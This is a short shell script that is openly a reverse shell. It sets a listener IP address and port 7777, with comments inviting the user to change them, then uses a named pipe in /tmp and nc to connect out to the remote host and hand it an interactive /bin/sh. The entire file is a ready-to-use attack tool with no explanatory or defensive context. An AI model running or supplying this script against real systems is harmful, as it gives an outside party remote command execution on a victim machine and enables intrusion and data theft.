#!/bin/sh
# LHOST_IP ip address of the machine receiving the shell
# PORT the remote port
LHOST_IP=127.0.0.1  #change IP_ADDR here
PORT=7777           #change port here
mkfifo /tmp/f; nc $LHOST_IP $PORT < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f;
